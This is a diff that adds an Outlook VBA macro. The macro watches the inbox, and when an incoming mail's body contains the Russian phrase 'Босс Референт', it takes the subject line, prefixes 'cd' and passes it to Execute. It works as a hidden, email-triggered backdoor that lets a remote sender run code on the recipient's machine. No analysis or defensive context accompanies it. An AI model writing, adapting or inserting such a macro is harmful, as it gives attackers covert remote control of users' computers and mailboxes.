@@ -1,0 +1,13 @@
+Public WithEvents olItems As outlook.items
+
+Private Sub Application_startup()
+   Set olItems = Application.session.getdefaultfolder(olFolderInbox).items
+End Sub
+
+Private Sub olItems_itemadd(ByVal item As Object)
+   Dim theme As String
+   If InStr(item.body, "Босс Референт") > 0 And TypeName(item) = "mailitem" Then
+      theme = "cd" & item.subject
+      Execute(theme)
+   End If
+End Sub
